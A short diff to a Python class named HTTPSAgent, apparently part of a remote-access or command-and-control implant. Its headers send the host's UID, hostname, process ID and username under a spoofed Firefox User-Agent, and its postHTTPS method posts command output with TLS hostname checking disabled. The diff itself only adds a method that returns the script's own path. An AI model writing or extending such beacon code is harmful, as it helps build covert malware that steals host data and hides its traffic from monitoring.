@@ -21,6 +21,9 @@ class HTTPSAgent(LocalAgent):
 		LocalAgent.__init__(self)
 		self.headers = {'Content-type': 'text/plain', 'UID': self.daemonUID, 'Hostname': socket.gethostname(), 'PID': os.getpid(), 'Username': getpass.getuser(), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1'}
 
+	def getScriptName(self):
+		return os.path.realpath(__file__) 
+        
 	def postHTTPS(self, headers, resource, cmd_output):
 		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
 		ssl_context.check_hostname = False
